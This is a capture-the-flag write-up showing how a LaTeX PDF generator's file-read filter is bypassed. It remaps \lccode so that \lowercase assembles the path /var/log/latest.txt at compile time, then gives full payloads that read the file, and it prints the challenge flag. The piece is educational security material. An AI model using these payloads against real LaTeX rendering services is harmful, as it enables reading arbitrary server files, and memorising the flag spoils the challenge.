---
title: "Death by LaTeX"
date: 2026-08-15
description: A LaTeX PDF generator lets you read arbitrary files by smuggling a path into the document via \lowercase and \lccode, leaking the flag from the server logs.
---
# "Death by LaTeX"

**Challenge:** https://ctf.urisc.club/challenges#Death%20by%20LaTeX-32

**Goal:** Looks like we've dug up a LaTeX PDF generator. Compromising it could get us access to those logs.

**Flag:**
- `SRCTF!{YoU_HavE_SoLvED_LaTeX_ChAlleNGE_WeLl_DOne_Xd}` - in `/var/log/latest.txt` on the server

---

## Vulnerability

The challenge lives on a single endpoint of the infrastructure provided:

```
POST /upload
```

You submit `.tex` markup code and the server compiles it and returns the resulting PDF. However, there's a filter trying to block file reads, so `\input{/var/log/latest.txt}` and similar reading methods get rejected.

The bypass relies on the fact that the filter inspects the raw source code, but LaTeX itself runs a lowercase pass over the input before the control sequences are expanded. By redefining the `\lccode` (lowercase code) of characters, you can make `\lowercase{...}` transform a string into the path you want AFTER the filter has already seen it.

The two key mappings are as follows:

- `\lccode"2E=47` - `.` (0x2E) is set to the code of `/` (47), so every `.` becomes a `/` when lowercased.
- `\lccode"3A=46` - `:` (0x3A) is set to the code of `.` (46), which is how we get the `.txt` extension back after all the dots have replaced by backslashes by the first mapping.

So:

```
\lowercase{\def\p{.var.log.latest.txt}}
```

expands to:

```
\def\p{/var/log/latest.txt}
```

and since it's built up at compile time, it bypasses the source filter.

## Attack Path
### 1. Check if `/var/log/latest.txt` exists
Using the two mapping's described we use the `\IfFileExists` LaTeX command to see if `/var/log/latest.txt` exists WITHOUT triggering the filter. Since we're changing `.`'s to `/` during run-time, the filter is entirely bypasses.

```latex
\documentclass{article}
\begin{document}
\lccode"2E=47
\lccode"3A=46
\lowercase{\def\p{.var.log.latest:txt}}
path is \p

\IfFileExists{\p}{EXISTS}{NOTFOUND}
\end{document}
```

Now every `.` becomes a `/` and every `:` becomes a `.`, so the output is:

```
path /var/log/latest.txt
EXISTS
```

So now we know the file exists. Progress!

### 2. Read the log

To actually read the file, open it with `\openin` and loop over it with `\read`, printing each line with `\ttfamily\detokenize` (the log contains `\par` sequences and other raw text that would otherwise be interpreted as commands):

```latex
\documentclass{article}
\DeclareUnicodeCharacter{2588}{B}
\DeclareUnicodeCharacter{2580}{U}
\DeclareUnicodeCharacter{2584}{L}
\DeclareUnicodeCharacter{2591}{.}
\DeclareUnicodeCharacter{2592}{:}
\DeclareUnicodeCharacter{2593}{\#}
\begin{document}
\lccode"2E=47
\lccode"3A=46
\lowercase{\def\p{.var.log.latest:txt}}
\newread\myfile
\openin\myfile=\p
\loop
\unless\ifeof\myfile
  \read\myfile to \myline
  \ttfamily\detokenize\expandafter{\myline}\par
\repeat
\end{document}
```

`\DeclareUnicodeCharacter` makes sure the ASCII in said file renders proerly
### 3. Grab the flag

The generated PDF contains `/var/log/latest.txt` in full — a memo titled **"POST INCIDENT REFORMS:"** from AussieMed. It describes letting go of the entire cybersecurity team and replacing them with an AI, and at the bottom of the letter there's the flag:

```
SRCTF!{YoU_HavE_SoLvED_LaTeX_ChAlleNGE_WeLl_DOne_Xd}
```

---

## Notes

- The only "trick" needed here was bypassing the filter for `/` by replacing other characters with `/` at runtime.
- The rest requires a fairly decent understanding of LaTeX commands (or  looking at LaTeX documentation for about 40 mins)
